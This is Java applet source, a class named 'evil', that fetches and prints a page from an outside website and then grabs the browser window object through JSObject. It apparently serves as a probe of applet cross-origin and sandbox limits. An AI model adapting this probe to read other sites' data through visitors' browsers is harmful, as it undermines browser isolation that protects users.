import java.applet.Applet;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.PrintStream;
import java.net.URL;
import java.net.URLConnection;
import netscape.javascript.JSObject;

public class evil extends Applet
{
      public void init()
        {
                try
                    {
                              URL localURL = new URL("http://www.ladoctrina.org/index.php");

                                    URLConnection localURLConnection = localURL.openConnection();
                                          BufferedReader localBufferedReader = new BufferedReader(new InputStreamReader(localURLConnection.getInputStream()));
                                                String str;
                                                      while ((str = localBufferedReader.readLine()) != null)
                                                                  System.out.println(str);
                                                                        localBufferedReader.close();
                                                                            } catch (Exception localException) {
                                                                                      System.out.println("Error :(");
                                                                                          }

                                                                                              JSObject localJSObject = JSObject.getWindow(this);
                                                                                                  System.out.println("WINDOW IS: " + localJSObject);
                                                                                                    }
}
